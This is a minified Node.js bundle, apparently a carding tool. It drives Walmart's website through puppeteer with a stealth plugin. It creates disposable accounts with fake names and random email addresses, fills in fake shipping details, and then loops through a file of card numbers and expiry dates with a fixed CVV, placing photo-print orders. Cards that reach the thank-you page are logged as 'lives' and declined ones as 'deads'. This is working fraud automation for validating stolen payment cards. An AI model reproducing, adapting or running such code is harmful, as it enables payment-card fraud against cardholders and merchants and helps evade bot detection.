var n=(t,a)=>()=>(a||t((a={exports:{}}).exports,a),a.exports);var q=n((mi,T)=>{var ht=require("fs"),mt=new Promise((t,a)=>{ht.readFile("./db/deads.txt","utf8",(i,e)=>{i&&a(i),t(e.split(`
`).filter(o=>o.length>0))})});T.exports={deads:mt}});var C=n((fi,S)=>{var ft=require("fs"),bt=new Promise((t,a)=>{ft.readFile("./db/lives.txt","utf8",(i,e)=>(i&&a(i),t(e.split(`
`).filter(o=>o.length>0))))});S.exports={lives:bt}});var _=n((bi,$)=>{var pt=require("fs"),Ft=new Promise((t,a)=>{pt.readFile("./db/tarjetas.txt","utf8",(i,e)=>{i&&a(i),e=e.split(`
`).filter(c=>c.length>0);let o=e.filter(c=>c.includes("|")),r=e.filter(c=>c.includes("|")==!1).map(c=>`${c}${o}`);t(r)})});$.exports={tarjetas:Ft}});var v=n((pi,g)=>{var{deads:xt}=q(),{lives:yt}=C(),{tarjetas:kt}=_();g.exports={deads:xt,lives:yt,tarjetas:kt}});var O=n((Fi,N)=>{var{tarjetas:Tt}=v(),D=[],m=[],P=[],j=[];Tt.then(t=>{for(var a of t)m.includes(a)==!1&&m.push(a);for(var i of m){var e=i.split("|")[0],o=i.split("|")[1],d=parseInt(i.split("|")[2]);D.push(e),P.push(o),j.push(d)}});N.exports={cards:D,fechaMes:P,fechaA\u00F1o:j}});var G=n((yi,A)=>{var qt=require("fs"),xi=require("colors"),{deads:St}=v(),Ct=async t=>{if((await St).filter(e=>e==t).length>0)return console.log(`${t.yellow} este ${"dead".red} ya existe en db/deads.txt`);qt.appendFile("./db/deads.txt",t+`
`,{encoding:"utf-8"},e=>{if(e)throw e;return console.log(`${t.red}`)})};A.exports={agregarDeads:Ct}});var X=n((ki,z)=>{var M=require("fs"),$t=t=>{M.readFile("./db/tarjetas.txt","utf8",(a,i)=>{let e=i.split(`
`).filter(r=>r.length>0),o=e.filter(r=>r!=t);if(e.length===o.length)return console.log("se ha colocado una tarjeta invalida");let d=o.join(`
`);M.writeFile("./db/tarjetas.txt",d,r=>{if(r)throw r})})};z.exports={barridoTarjetas:$t}});var E=n((qi,L)=>{var _t=require("fs"),Ti=require("colors"),{lives:gt}=v(),Dt=async t=>{let a=t.split("|")[0];await gt.then(i=>{if(console.log(i),i.filter(o=>o===t).length>0)return console.log(`${t.yellow} este live ya existe en db/live.txt`);_t.appendFile("./db/lives.txt",t+`
`,{encoding:"utf-8"},o=>{if(o)throw o;return console.log(`${a.green}`)})})};L.exports={agregarLive:Dt}});var B=n((Si,R)=>{var Pt=(t,a)=>{(!a||a<1)&&(a=t.length);for(let i=0;i<a;++i){let e=Math.floor(Math.random()*t.length),o=Math.floor(Math.random()*t.length),d=t[e];t[e]=t[o],t[o]=d}};R.exports={disorder:Pt}});var Z=n((Ci,U)=>{var{disorder:jt}=B(),{faker:f}=require("@faker-js/faker"),Nt=require("fs"),Ot=async({page:t,productoPersonalizado:a})=>{console.log("no tienes cuenta creada, se procedera a crear una".yellow);let i=!0,e="https://www.walmart.com/account/?action=Create&rm=true",o=f.internet.password(10,!0,/[A-Z][0-9][a-z]/,"@Hookom119"),d=["a","b","c","d","e","f","g","h","i","1","2","6","3","z","h","1","9","0","o","p","Z","i","1","2","6","3","z","h","1","9","0","o","p","Z"];jt(d),d=d.toString().replaceAll(",","")+"@gmail.com",await t.goto("https://www.walmart.com/account/signup?vid=oaoh"),await t.waitForSelector("#sign-in-form > div > div > input"),await t.type("#sign-in-form > div > div > input",d),await t.click("#sign-in-form > button"),await t.waitForNavigation(),await t.waitForSelector("#sign-up-form > div:nth-child(2) > div > input"),await t.waitForTimeout(1e3),await t.type("#sign-up-form > div:nth-child(2) > div > input",f.name.firstName()),await t.type("#sign-up-form > div:nth-child(4) > div > input",f.name.lastName()),await t.type("#sign-up-form > div:nth-child(7) > div > div > input",o),await t.click("#sign-up-form > button"),await t.waitForNavigation(),await t.waitForTimeout(1e3),await t.$("div > button > svg")&&await t.click("div > button > svg"),await t.waitForTimeout(1e3),e==="https://www.walmart.com/account/?action=Create&rm=true"&&console.log("Cuenta creada correctamente".green),await t.goto(a||"https://www.walmart.com/ip/seort/10448549"),await t.waitForSelector(".dib > button"),await t.waitForTimeout(3e3),await t.click(".dib > button"),await t.waitForTimeout(3e3),await t.goto("https://www.walmart.com/cart"),await t.waitForSelector(".flex .sticky .shadow-1 div .ph3  button"),await t.waitForTimeout(3e3),await t.$("div.flex.items-baseline.pl2.ml1-l > button")&&(await t.click("div.flex.items-baseline.pl2.ml1-l > button"),await t.waitForTimeout(2e3),await t.click(".flex .sticky .shadow-1 div .ph3  button"),await t.waitForNavigation(),await t.waitForTimeout(6e3),await t.$("div > div > section > div > div:nth-child(4) > div")&&(await t.waitForSelector("div > div > section > div > div:nth-child(4) > div"),await t.waitForTimeout(2e3),await t.click("div > div > section > div > div:nth-child(4) > div"),await t.waitForTimeout(1e3),await t.waitForSelector("div.ba.b--light-gray.w-100.bg-white.flex.br-pill.items-center > input"),await t.type("div.ba.b--light-gray.w-100.bg-white.flex.br-pill.items-center > input","10001"),await t.waitForSelector("div.pa0.ma0 > div:nth-child(1) > label"),await t.click("div.pa0.ma0 > div:nth-child(1) > label"),await t.waitForTimeout(1e3),await t.waitForSelector("div.w-100.pa4.bt.b--near-white > button"),await t.click("div.w-100.pa4.bt.b--near-white > button"),await t.waitForTimeout(1e3),await t.waitForSelector("div.flex.justify-center.pb6 > div > div > div > div > button"),await t.click("div.flex.justify-center.pb6 > div > div > div > div > button"),await t.waitForNavigation(),console.log("producto agregado al carrito".green)),i=!1),i==!0&&(await t.waitForTimeout(2e3),await t.click(".flex .sticky .shadow-1 div .ph3  button"),await t.waitForTimeout(6e3),await t.$("div > div > section > div > div:nth-child(4) > div")&&(await t.waitForSelector("div > div > section > div > div:nth-child(4) > div"),await t.waitForTimeout(2e3),await t.click("div > div > section > div > div:nth-child(4) > div"),await t.waitForTimeout(1e3),await t.waitForSelector("div.ba.b--light-gray.w-100.bg-white.flex.br-pill.items-center > input"),await t.type("div.ba.b--light-gray.w-100.bg-white.flex.br-pill.items-center > input","10001"),await t.waitForSelector("div.pa0.ma0 > div:nth-child(1) > label"),await t.click("div.pa0.ma0 > div:nth-child(1) > label"),await t.waitForTimeout(1e3),await t.waitForSelector("div.w-100.pa4.bt.b--near-white > button"),await t.click("div.w-100.pa4.bt.b--near-white > button"),await t.waitForTimeout(1e3),await t.waitForSelector("div.flex.justify-center.pb6 > div > div > div > div > button"),await t.click("div.flex.justify-center.pb6 > div > div > div > div > button"),await t.waitForNavigation(),console.log("producto agregado al carrito".green))),await t.waitForSelector("#totalSummary"),await t.waitForTimeout(2e3);let s=!0;do{let l=t.mainFrame().url();await t.waitForTimeout(1e3),l.search("checkout")!=-1&&(Nt.writeFile("./db/carritoUrl.txt",l,"utf8",h=>{if(h)throw h;console.log("carrito extraido con \xE9xito".green)}),s=!1)}while(s)};U.exports={login:Ot}});var b=n(($i,H)=>{var{login:At}=Z(),Gt=require("fs"),Mt=async({page:t,productoPersonalizado:a})=>{let i="#__next > div:nth-child(1) > div > span > header > div:nth-child(7) > a";return console.log("iniciando scrapper..."),await t.goto("https://www.walmart.com"),await t.waitForSelector(i),(await t.$eval(i,o=>o.href)).includes("https://www.walmart.com/account/login?vid=oaoh")===!0?(await At({page:t,productoPersonalizado:a}),Gt.readFileSync("./db/carritoUrl.txt","utf-8")):console.log("Ya existe un usuario".yellow)};H.exports={verifyLogin:Mt}});var p=n((_i,V)=>{var zt=async({page:t})=>{let a='button[data-automation-id="fulfillment-continue"]';await t.waitForTimeout(1e3);let i=await t.$(a),e=await t.mainFrame().url();e.search("fulfillment")!=-1&&await t.waitForSelector(a),i&&e.search("fulfillment")!=-1&&(await t.click(a),await t.waitForNavigation())};V.exports={stepOneFullFillMentPhoto:zt}});var F=n((gi,W)=>{var Xt=async({page:t})=>{let a='button[data-automation-id="address-book-action-buttons-on-continue"]',i="#firstName",e="#lastName",o="#phone",d="#addressLineOne",r="div:nth-child(6) > div > button.button.button--link > span",c=!0;await t.waitForTimeout(1e3);let s=await t.$(i),l=await t.mainFrame().url();if(l.search("shipping-address")!=-1&&await t.waitForSelector(i),await t.waitForTimeout(1e3),s&&l.search("shipping-address")!=-1){i&&(await t.waitForSelector(i),await t.type(i,"John"),await t.type(e,"Lenon"),await t.type(o,"2121523478"),await t.type(d,"Calle buena"),await t.waitForTimeout(200),await t.click(a),await t.waitForSelector(r),await t.waitForTimeout(1e3),await t.click(r),await t.waitForSelector('[data-automation-id="address-tile-1"]'),await t.waitForTimeout(1e3)),await t.waitForSelector(a),await t.waitForTimeout(1e3),await t.click(a);do await t.waitForTimeout(1e3),c=await t.$("div.spinner.spinner-large.spinner-colorize.spinner-fixed");while(c)}};W.exports={stepTwoFullFillMentPhoto:Xt}});var I=n((Di,Y)=>{var{stepOneFullFillMentPhoto:Lt}=p(),{stepTwoFullFillMentPhoto:Et}=F(),Rt=async({page:t})=>{let a="#dropArea > div.device > label",i="button.btn.btn-primary.btn-md-long.action.mb-0.font-weight-bold[disabled]",e='a[class="btn btn-primary btn-add-to-cart disabled"]',o="#zip-code-popover > div > div > input";await t.goto("https://photos3.walmart.com/order/prints-builder?finish=glossy&size=4x4&copies=1#"),await t.waitForSelector(a),await t.waitForTimeout(1e3);let[d]=await Promise.all([t.waitForFileChooser(),t.click(a)]);await d.accept(["./assets/logo.png"]);let r=!0;do await t.waitForTimeout(1e3),r=await t.$(i);while(r);await t.waitForTimeout(1500),await t.click('button[aria-label="Add photos"]'),r=!0;do await t.waitForTimeout(1e3),r=await t.$(e);while(r);await t.click('a[class="btn btn-primary btn-add-to-cart"]'),await t.waitForSelector("#popover-anchor"),await t.waitForTimeout(1e3),await t.click("#popover-anchor"),await t.waitForSelector(o),await t.waitForTimeout(1e3),await t.click(o),await t.$eval(o,c=>c.value=""),await t.waitForTimeout(1e3),await t.type(o,"10001"),await t.waitForTimeout(1e3),await t.click("#zip-code-popover > div > button.btn.btn-primary"),await t.waitForTimeout(1e3),await t.click("a.checkout-button.btn.btn-primary.btn-lg.btn-block"),await t.waitForNavigation(),await Lt({page:t}),await Et({page:t})};Y.exports={fotoAuto:Rt}});var tt=n((ji,K)=>{var Q=require("puppeteer-extra"),{cards:w,fechaMes:x,fechaA\u00F1o:y}=O(),Bt=require("puppeteer-extra-plugin-stealth"),{agregarDeads:Ut}=G(),{barridoTarjetas:J}=X(),{agregarLive:Zt}=E(),Ht=require("fs"),{verifyLogin:Vt}=b(),{fotoAuto:Wt}=I(),{stepOneFullFillMentPhoto:Yt}=p(),{stepTwoFullFillMentPhoto:It}=F(),{join:Pi}=require("path");Q.use(Bt());var Jt=async({productoPersonalizado:t})=>{let a=0;countl=0,contador=1;let i,e=await Q.launch({headless:!1,defaultViewport:null,ignoreHTTPSErrors:!0,userDataDir:"./userData",channel:"chrome",args:["--start-maximized","--disable-gpu","--disable-dev-shm-usage","--disable-setuid-sandbox","--no-sandbox"]}),o=(await e.pages())[0];o.setDefaultTimeout(0),o.setDefaultNavigationTimeout(0),await Vt({page:o,productoPersonalizado:t}),await o.goto("https://www.walmart.com/checkout/photo#/payment");let d=Ht.readFileSync("./db/carritoUrl.txt","utf-8");for(var r=0;r<=w.length;++r){let s=!0,l=!0;await o.waitForTimeout(3e3),await o.$('div[data-modal-message-descriptor="PhotoPCExpiredMessage"]')&&await Wt({page:o}),await Yt({page:o}),await It({page:o});do{await o.$("body > div.js-content > div > div.checkout-wrapper > div > div.accordion-inner-wrapper > div.checkout-accordion > div > div > div.expandable-modules.checkout-responsive-container > div:nth-child(3) > div > div > div > div > div > div > div.CXO_module_header_edit > button")&&(await o.click("body > div.js-content > div > div.checkout-wrapper > div > div.accordion-inner-wrapper > div.checkout-accordion > div > div > div.expandable-modules.checkout-responsive-container > div:nth-child(3) > div > div > div > div > div > div > div.CXO_module_header_edit > button"),await o.waitForTimeout(2500),l=!1),await o.$("body > div.js-content > div > div.checkout-wrapper > div > div.accordion-inner-wrapper > div.checkout-accordion > div > div > div > div:nth-child(3) > div.CXO_module_container > div.CXO_module_body.ResponsiveContainer > div > div > div > div.text-left.Grid > div:nth-child(2) > div > div > div > div.text-left.Grid > div:nth-child(1) > div > div > div > div > div:nth-child(2) > div > div.card-body.clearfix > div.credit-card-actions > button.button.last.cc-delete-action.button--link > span")&&(await o.waitForSelector("body > div.js-content > div > div.checkout-wrapper > div > div.accordion-inner-wrapper > div.checkout-accordion > div > div > div > div:nth-child(3) > div.CXO_module_container > div.CXO_module_body.ResponsiveContainer > div > div > div > div.text-left.Grid > div:nth-child(2) > div > div > div > div.text-left.Grid > div:nth-child(1) > div > div > div > div > div:nth-child(2) > div > div.card-body.clearfix > div.credit-card-actions > button.button.last.cc-delete-action.button--link > span"),await o.waitForTimeout(1e3),await o.click("body > div.js-content > div > div.checkout-wrapper > div > div.accordion-inner-wrapper > div.checkout-accordion > div > div > div > div:nth-child(3) > div.CXO_module_container > div.CXO_module_body.ResponsiveContainer > div > div > div > div.text-left.Grid > div:nth-child(2) > div > div > div > div.text-left.Grid > div:nth-child(1) > div > div > div > div > div:nth-child(2) > div > div.card-body.clearfix > div.credit-card-actions > button.button.last.cc-delete-action.button--link > span"),await o.waitForTimeout(1e3),await o.waitForSelector("body > div.js-content > div > div.checkout-wrapper > div > div.accordion-inner-wrapper > div.checkout-accordion > div > div > div > div:nth-child(3) > div.CXO_module_container > div.CXO_module_body.ResponsiveContainer > div > div > div > div.text-left.Grid > div:nth-child(2) > div > div > div > div.text-left.Grid > div:nth-child(1) > div > div > div > div > div > div > div > div.credit-card-full-actions > button.button.cc-confirm-delete.button--ghost > span"),await o.waitForTimeout(1e3),await o.click("body > div.js-content > div > div.checkout-wrapper > div > div.accordion-inner-wrapper > div.checkout-accordion > div > div > div > div:nth-child(3) > div.CXO_module_container > div.CXO_module_body.ResponsiveContainer > div > div > div > div.text-left.Grid > div:nth-child(2) > div > div > div > div.text-left.Grid > div:nth-child(1) > div > div > div > div > div > div > div > div.credit-card-full-actions > button.button.cc-confirm-delete.button--ghost > span"),await o.waitForSelector("#firstName"),l=!1);let vt=await o.$("#firstName");await o.waitForTimeout(2e3),vt&&(await o.type("#creditCard",`${w[r]}`),await o.type("#month-chooser",`${x[r]}`),await o.type("#year-chooser",`${y[r]}`),await o.type("#cvv","065"),await o.waitForTimeout(1e3),await o.click("div > form > div.edit-form-actions > div > button"),await o.waitForTimeout(2e3),l=!1)}while(l);do await o.waitForTimeout(1e3),s=await o.$("div.spinner.spinner-large.spinner-colorize.spinner-fixed");while(s);if(console.log(contador," ",w[r]),a==0&&(i=await e.newPage(),i.setDefaultTimeout(0),i.setDefaultNavigationTimeout(0)),await i.bringToFront(),await i.waitForTimeout(2e3),await i.goto(d),await i.waitForSelector("#cvv-field"),await i.$("#cvv-field")){await i.type("#cvv-field","123"),await o.waitForTimeout(1e3),await i.click("#mobile-sticky-footer > div > section > button"),await i.waitForTimeout(7e3);let ut=await i.$("body > div:nth-child(18) > div > div.w_HB > div.w_GY.w_GZ > div > div.w_Gh > div > div > div.w_Q.w_U.mb1");t:var c=i.mainFrame().url();c.search("thankyou")!=-1&&(countl++,console.log("lives del lote",countl),await Zt(`${w[r]}|${x[r]}|${y[r]}`),J(`${w[r]}`),await i.goto(t||"https://www.walmart.com/ip/seort/10448549"),await i.waitForSelector(".dib > button"),await i.waitForTimeout(3e3),await i.click(".dib > button"),await i.waitForTimeout(3e3),await i.goto("https://www.walmart.com/cart"),await i.waitForSelector(".flex .sticky .shadow-1 div .ph3  button"),await i.click(".flex .sticky .shadow-1 div .ph3  button"),await i.waitForTimeout(7e3)),c.search("thankyou")==-1&&(await Ut(`${w[r]}|${x[r]}|${y[r]}`),J(`${w[r]}`)),i&&(a=1),await o.bringToFront(),contador++}}await e.close()};K.exports={foto:Jt}});var at=n((Ni,ot)=>{var it=require("puppeteer-extra"),Qt=require("puppeteer-extra-plugin-stealth"),{verifyLogin:Kt}=b();it.use(Qt());var ti=async({productoPersonalizado:t})=>{let a=await it.launch({headless:!1,defaultViewport:null,channel:"chrome",userDataDir:"./userData",args:["--start-maximized","--disable-gpu","--disable-dev-shm-usage","--disable-setuid-sandbox","--no-sandbox"]}),i=(await a.pages())[0];return await i.setDefaultTimeout(0),await i.setDefaultNavigationTimeout(0),await Kt({page:i,productoPersonalizado:t}),await a.close()};ot.exports={loginAuto:ti}});var nt=n((Oi,rt)=>{var et=require("puppeteer-extra"),ii=require("puppeteer-extra-plugin-stealth");et.use(ii());var oi=async({tipo:t})=>{let i=(await(await et.launch({headless:!1,defaultViewport:null,userDataDir:"./userData",channel:"chrome",args:["--start-maximized","--disable-gpu","--disable-dev-shm-usage","--disable-setuid-sandbox","--no-sandbox"]})).pages())[0];await i.setDefaultTimeout(0),await i.bringToFront(),t=="manual-login"&&await i.goto("https://www.walmart.com/account/login"),t=="manual-foto"&&await i.goto("https://photos3.walmart.com/order/prints-builder?finish=glossy&size=4x4&copies=1#")};rt.exports={manual:oi}});var ct=n((Ai,dt)=>{var{foto:ai}=tt(),{loginAuto:ei}=at(),{manual:ri}=nt(),ni=async({tipo:t,productoPersonalizado:a})=>{t==="foto"&&ai({productoPersonalizado:a}),t==="login"&&ei({productoPersonalizado:a}),(t==="manual-login"||t==="manual-foto")&&ri({tipo:t})};dt.exports={selectorScrapper:ni}});var wt=n((Gi,st)=>{var{Router:di}=require("express"),{selectorScrapper:ci}=ct(),lt=di();lt.post("/",async(t,a)=>{let{tipo:i,productoPersonalizado:e}=t.body;await ci({tipo:i,productoPersonalizado:e}),a.send()});st.exports=lt});var k=require("express"),li=wt(),si=require("detect-port"),u=k(),wi=async()=>(await si().then(t=>{u.set("port",t)}),u.use(k.urlencoded({extended:!1})),u.use(k.json()),u.use(li),u.listen(u.get("port")),u.get("port"));module.exports={server:wi};
